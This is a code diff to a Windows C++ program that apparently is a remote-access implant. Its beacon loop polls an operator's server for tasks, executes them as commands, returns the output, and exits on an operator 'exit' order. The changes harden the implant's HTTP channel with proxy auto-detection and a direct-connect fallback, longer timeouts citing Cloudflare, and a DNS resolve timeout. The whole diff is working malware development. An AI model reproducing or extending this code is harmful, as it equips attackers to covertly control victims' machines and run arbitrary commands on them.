@@ -199,19 +199,27 @@ static HttpResponse WinHttpRequest(
     }
 
     WinHttpHandles h;
+    // Try automatic proxy first (respects system/IE proxy settings)
     h.session = _Open(config::GetUserAgent(),
-                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                      WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                       WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!h.session) {
+        // Fallback: direct connect
+        h.session = _Open(config::GetUserAgent(),
+                          WINHTTP_ACCESS_TYPE_NO_PROXY,
+                          WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    }
     if (!h.session) {
         DebugLog(L"WinHttpOpen failed");
         return resp;
     }
 
-    DWORD timeout = 20000;
+    DWORD timeout = 45000; // 45s — Cloudflare cold start can be slow
     if (_SetOption) {
         _SetOption(h.session, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
         _SetOption(h.session, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
         _SetOption(h.session, WINHTTP_OPTION_SEND_TIMEOUT,    &timeout, sizeof(timeout));
+        _SetOption(h.session, WINHTTP_OPTION_RESOLVE_TIMEOUT, &timeout, sizeof(timeout));
     }
 
     h.connect = _Connect(h.session, host.c_str(), port, 0);
@@ -709,7 +717,7 @@ static void SetWallpaperFromUrl(const wchar_t* host, const wchar_t* urlPath) {
 // =====================================================================
 //  MAIN BEACON LOOP
 // =====================================================================
-VOID BeaconLoop(const Session& session) {
+DWORD BeaconLoop(const Session& session) {
     DebugLog(L"BeaconLoop started");
 
     g_SessionId  = session.sessionId;
@@ -779,7 +787,7 @@ VOID BeaconLoop(const Session& session) {
                 if (task == L"exit") {
                     DebugLog(L"Exit received");
                     SendResult(session.sessionId, L"[ghost] exiting on operator command");
-                    return;
+                    return 0xDEAD;
                 }
                 DebugLog(L"Exec: " + task);
                 std::wstring result = ExecuteCommand(task);
@@ -803,4 +811,5 @@ VOID BeaconLoop(const Session& session) {
             Sleep(15000);
         }
     }
+    return 1; // unreachable, but satisfies compiler
 }
